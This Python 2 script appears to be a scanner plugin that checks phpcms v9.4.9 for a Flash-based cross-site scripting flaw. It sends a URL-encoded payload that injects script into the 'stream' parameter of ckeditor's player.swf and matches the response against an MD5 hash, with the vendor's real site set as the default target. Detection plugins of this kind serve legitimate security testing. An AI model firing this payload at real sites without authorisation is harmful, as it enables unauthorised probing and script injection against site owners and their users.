#!/usr/bin/env python
#coding = utf-8
import re,urllib,md5

def assign(service, arg):
    if service == "phpcms":
        return True, arg

def audit(arg):
    url = arg
    md5_check_value = 'cf00b069e36e756705c49b3a3bf20c40'
    payload = urllib.unquote("statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf%26stream%3D%5C%2522%29%29%7Dcatch%28e%29%7Balert%281%29%7D%2f%2f")
    code, head, res, errcode, _ = curl.curl(url+payload)
    if code == 200:
		md5_buff = md5.new(res).hexdigest()
		if md5_buff in md5_check_value:
			security_info(url + 'phpcms v9.4.9 flash xss')
		

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpcms', "http://www.phpcms.cn/")[1])
